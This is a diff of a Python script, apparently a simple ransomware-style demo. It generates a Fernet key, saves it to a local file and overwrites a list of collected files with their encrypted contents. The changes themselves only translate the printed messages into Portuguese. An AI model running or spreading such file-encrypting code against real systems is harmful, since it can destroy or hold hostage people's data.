@@ -1,6 +1,6 @@
 import os
 from cryptography.fernet import Fernet
-print("... libraries imported")
+print("...bibliotecas importadas")
 
 
 # Collect files
@@ -21,11 +21,11 @@ def get_file_list():
 
 def generate_key_file():
 	key = Fernet.generate_key()
-	print("Key is:", key)
+	print("A chave é:", key)
 
 	with open("key_file.key", "wb") as f:
 		f.write(key)
-	print("...key-file generated")
+	print("...arquivo-chave gerado")
 	return key
 
 
@@ -41,7 +41,7 @@ def encryption_process(files, key):
 		with open(file, "wb") as f:
 			f.write(encrypted_content)
 
-	print("...arquivos criptografados! :) ")
+	print("...arquivos criptografados!")
 
 
 # function calls
